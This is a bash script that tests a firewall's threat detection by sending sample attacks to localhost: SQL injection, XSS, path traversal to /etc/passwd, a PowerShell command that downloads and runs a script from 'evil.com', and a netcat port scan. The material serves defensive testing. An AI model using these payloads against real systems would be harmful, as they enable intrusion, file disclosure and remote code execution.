#!/bin/bash
echo "🔥 Testing FirewallX Threat Detection"
echo "======================================"
echo ""

# Test 1: SQL Injection
echo "Test 1: SQL Injection Attack"
curl -s "http://localhost:80/login?user=' OR '1'='1&pass=x" | head -3 || echo "✅ Blocked by DPI"
echo ""

# Test 2: XSS Attempt  
echo "Test 2: XSS Attack"
curl -s "http://localhost:80/search?q=<script>alert('xss')</script>" | head -3 || echo "✅ Blocked by DPI"
echo ""

# Test 3: Path Traversal
echo "Test 3: Path Traversal Attack"
curl -s "http://localhost:80/file?name=../../../etc/passwd" | head -3 || echo "✅ Blocked by DPI"
echo ""

# Test 4: PowerShell Malware
echo "Test 4: PowerShell Download Attack"
curl -s -A "PowerShell" "http://localhost:80/malware.ps" --data "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" | head -3 || echo "✅ Blocked by DPI"
echo ""

# Test 5: Port Scan Simulation
echo "Test 5: Port Scan Detection (simulated)"
for port in 22 80 443 3306 5432 8080; do
    nc -z localhost $port 2>&1 | grep -q "succeeded" && echo "  Port $port: OPEN" || echo "  Port $port: BLOCKED/FILTERED"
done
echo ""

echo "======================================"
echo "✅ All threat tests completed!"
